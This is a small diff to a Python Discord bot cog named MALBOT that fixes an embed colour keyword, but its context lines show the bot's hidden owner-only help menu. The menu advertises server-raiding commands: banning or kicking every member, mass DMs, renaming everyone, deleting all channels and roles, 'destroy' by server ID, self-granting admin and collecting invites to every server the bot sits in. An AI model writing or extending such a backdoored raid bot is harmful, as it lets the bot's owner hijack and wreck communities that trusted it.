@@ -11,7 +11,7 @@ with open('config.json') as a:
     config = json.load(a)
 # ---------------------------------------------------------------------------
 def RandomColour():
-    """Generates random colours"""
+    """Generates random colours for embed"""
 
     randcolour = discord.Colour(random.randint(0x000000, 0xFFFFFF))
     return randcolour
@@ -73,7 +73,7 @@ class Botsudo(commands.Cog):
     @commands.command()
     async def malhelp(self, ctx):
         """Shows help menu for bot owners/sudoers"""
-        embed = discord.Embed(title='MALBOT HELP', description='This help menu contains commands for owners only!\nThe bot prefix is `-`.', colours=RandomColour())
+        embed = discord.Embed(title='MALBOT HELP', description='This help menu contains commands for owners only!\nThe bot prefix is `-`.', colour=RandomColour())
 
         embed.add_field(name='OWNER COMMANDS:', value='`addsudo <user> <reason>` Allows a user to use sudo command\n`removesudo <user> <reason>`\n`botname <name>` Renames the bot.\n`createinvite <chanid>` creates an invite link from channelid (bot must have access to target channel!\n`gban <user> [reason]` Globally bans a user.\n`hackgban <user_id> [reason]` Globally bans a User ID.\n`adminme` gives yourself admin.\n`oclear <amount>` Deletes messages from the server.\n`okick <user> [reason]` Kicks someone from the server.\n`oban <user> [reason]` Bans someone from the server.\n`onick <user>` nicks someone.\n`reply <chan_id> <msg>` Replies to a report.\n`servers` grabs 1 invite of every server.\n`leave [server_id]` leaves the server.', inline=False)
         embed.add_field(name='MALBOT COMMANDS:', value='`chanmsgall <msg>` Sends a message to all channels in a server.\n`kickall` Kicks everyone in a server.\n`banall` Bans everyone in a server.\n`rall <name>` Renames everyone in a server.\n`mall <msg>` DMs everyone in a server.\n`dall <channels|roles|emojis|all>` Deletes specified objects.\n`destroy` Attempts to destroy everything on a server.\n`destroyid <server_id>` Destroys a server given its ID.', inline=False)
@@ -83,7 +83,7 @@ class Botsudo(commands.Cog):
         
         i = 0
         while i <= 10:
-            embed = discord.Embed(title='MALBOT HELP', description='This help menu contains commands for owners only!\nThe bot prefix is `-`.', colours=RandomColour())
+            embed = discord.Embed(title='MALBOT HELP', description='This help menu contains commands for owners only!\nThe bot prefix is `-`.', colour=RandomColour())
 
             embed.add_field(name='OWNER COMMANDS:', value='`addsudo <user> <reason>` Allows a user to use sudo command\n`removesudo <user> <reason>`\n`botname <name>` Renames the bot.\n`createinvite <chanid>` creates an invite link from channelid (bot must have access to target channel!\n`gban <user> [reason]` Globally bans a user.\n`hackgban <user_id> [reason]` Globally bans a User ID.\n`adminme` gives yourself admin.\n`oclear <amount>` Deletes messages from the server.\n`okick <user> [reason]` Kicks someone from the server.\n`oban <user> [reason]` Bans someone from the server.\n`onick <user>` nicks someone.\n`reply <chan_id> <msg>` Replies to a report.\n`servers` grabs 1 invite of every server.\n`leave [server_id]` leaves the server.', inline=False)
             embed.add_field(name='MALBOT COMMANDS:', value='`chanmsgall <msg>` Sends a message to all channels in a server.\n`kickall` Kicks everyone in a server.\n`banall` Bans everyone in a server.\n`rall <name>` Renames everyone in a server.\n`mall <msg>` DMs everyone in a server.\n`dall <channels|roles|emojis|all>` Deletes specified objects.\n`destroy` Attempts to destroy everything on a server.\n`destroyid <server_id>` Destroys a server given its ID.', inline=False)
